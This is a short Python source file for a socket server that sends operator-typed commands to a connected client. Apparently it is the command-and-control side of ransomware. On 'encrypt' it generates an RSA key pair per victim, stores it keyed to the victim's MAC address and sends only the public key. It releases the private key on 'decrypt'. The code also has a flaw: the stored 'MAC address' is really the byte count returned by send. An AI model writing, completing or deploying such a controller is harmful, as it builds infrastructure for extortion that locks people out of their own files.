import socket
from Database import load_private_key_from_db, load_public_key_from_db
from Rsa import generate_keys
from Database import insert_to_db

def create_server(host='127.0.0.1', port=12345):
    # Create server that accepts client connections and sends commands

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(99)

    print(f"Server listening on {host}:{port}")

    client_socket, client_address = server.accept()
    print(f"Accepted connection from {client_address}")
    mac_address = client_socket.send('get mac'.encode('utf-8'))

    while True:
        command = input("Enter a command (or 'exit' to quit): ")
        client_socket.send(command.encode('utf-8'))

        if command.lower() == "exit":
            break

        if command == "encrypt":
            private_pem, public_pem = generate_keys()
            insert_to_db(private_pem, public_pem, mac_address)
            client_socket.send(str(load_public_key_from_db(mac_address),'utf-8').encode('utf-8'))

        
        if command == "decrypt":
            client_socket.send(str(load_private_key_from_db(mac_address),'utf-8').encode('utf-8'))

        result = client_socket.recv(4096).decode('utf-8')
        print("Client response:")
        print(result)

    client_socket.close()
    server.close()
